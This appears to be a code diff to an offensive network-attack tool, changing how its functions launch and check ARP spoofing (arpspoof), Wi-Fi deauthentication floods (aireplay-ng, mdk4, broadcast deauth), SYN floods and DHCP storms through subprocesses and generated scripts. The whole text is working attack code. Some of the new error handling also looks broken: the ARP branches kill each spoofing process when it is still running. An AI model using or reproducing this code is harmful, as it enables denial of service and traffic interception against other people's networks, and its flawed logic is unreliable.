@@ -4847,24 +4847,30 @@ def start_attack_arp_freeze(targets, gateway, iface):
         for t in targets:
             cmd = ['arpspoof', '-i', iface, '-t', t, gateway]
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-            time.sleep(0.1)
-            if proc.poll() is not None:
-                stderr = proc.stderr.read().decode(errors='ignore').strip() if proc.stderr else ''
+            try:
+                _, err_bytes = proc.communicate(timeout=0.5)
+                stderr = err_bytes.decode(errors='ignore').strip() if err_bytes else ''
                 error_msg = f'arpspoof failed for target {t}'
                 if stderr:
                     error_msg += f': {stderr}'
                 raise RuntimeError(error_msg)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait(timeout=1)
             pids.append(proc)
         for t in targets:
             cmd = ['arpspoof', '-i', iface, '-t', gateway, t]
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-            time.sleep(0.1)
-            if proc.poll() is not None:
-                stderr = proc.stderr.read().decode(errors='ignore').strip() if proc.stderr else ''
+            try:
+                _, err_bytes = proc.communicate(timeout=0.5)
+                stderr = err_bytes.decode(errors='ignore').strip() if err_bytes else ''
                 error_msg = f'arpspoof failed for gateway {gateway}'
                 if stderr:
                     error_msg += f': {stderr}'
                 raise RuntimeError(error_msg)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait(timeout=1)
             pids.append(proc)
         return pids
     else:
@@ -4928,10 +4934,13 @@ def start_attack_arp_freeze(targets, gateway, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        time.sleep(0.5)
-        if proc.poll() is not None:
-            stderr = proc.stderr.read().decode(errors='ignore') if proc.stderr else ''
+        try:
+            _, err_bytes = proc.communicate(timeout=0.5)
+            stderr = err_bytes.decode(errors='ignore') if err_bytes else ''
             raise RuntimeError(f'ARP fallback script exited immediately: {stderr}')
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait(timeout=1)
         # Monitor stderr from the ARP script in background
         def monitor_arp_fallback(proc_ref, path_ref):
             try:
@@ -4975,9 +4984,11 @@ def start_attack_deauth_native(targets, iface):
     with open(path, 'w') as f:
         f.write(script)
     proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-    time.sleep(0.5)
-    if proc.poll() is not None:
+    try:
+        _, err_bytes = proc.communicate(timeout=0.5)
         raise RuntimeError('Native deauth flood script exited immediately')
+    except subprocess.TimeoutExpired:
+        pass  # Process still running (good), continue
     threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
     return [proc]
 
@@ -5011,14 +5022,14 @@ def start_attack_deauth(targets, gateway, iface):
                         break
                 if t_mac:
                     cmd = ['aireplay-ng', '-0', '0', '-a', gateway_mac, '-c', t_mac, iface]
-                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     time.sleep(0.1)
                     if proc.poll() is not None:
                         continue
                     pids.append(proc)
         if not pids:
             cmd = ['aireplay-ng', '-0', '0', '-a', 'FF:FF:FF:FF:FF:FF', iface]
-            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(0.1)
             if proc.poll() is not None:
                 raise RuntimeError('aireplay-ng broadcast deauth failed')
@@ -5026,7 +5037,7 @@ def start_attack_deauth(targets, gateway, iface):
         return pids
     elif ensure_tool('mdk4'):
         cmd = ['mdk4', iface, 'd', '-c', '100']
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(0.1)
         if proc.poll() is not None:
             raise RuntimeError('mdk4 deauth failed')
@@ -5059,9 +5070,11 @@ def start_attack_deauth(targets, gateway, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-        time.sleep(0.5)
-        if proc.poll() is not None:
+        try:
+            _, err_bytes = proc.communicate(timeout=0.5)
             raise RuntimeError('Deauth fallback script exited immediately')
+        except subprocess.TimeoutExpired:
+            pass  # Process still running (good), continue
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
@@ -5116,9 +5129,11 @@ def start_attack_syn_flood(targets, port, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-        time.sleep(0.5)
-        if proc.poll() is not None:
+        try:
+            _, err_bytes = proc.communicate(timeout=0.5)
             raise RuntimeError('SYN flood fallback script exited immediately')
+        except subprocess.TimeoutExpired:
+            pass  # Process still running (good), continue
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
@@ -5180,9 +5195,11 @@ def start_attack_dhcp_storm(targets, gateway, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-        time.sleep(0.5)
-        if proc.poll() is not None:
+        try:
+            _, err_bytes = proc.communicate(timeout=0.5)
             raise RuntimeError('DHCP storm fallback script exited immediately (raw socket permission likely denied)')
+        except subprocess.TimeoutExpired:
+            pass  # Process still running (good), continue
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
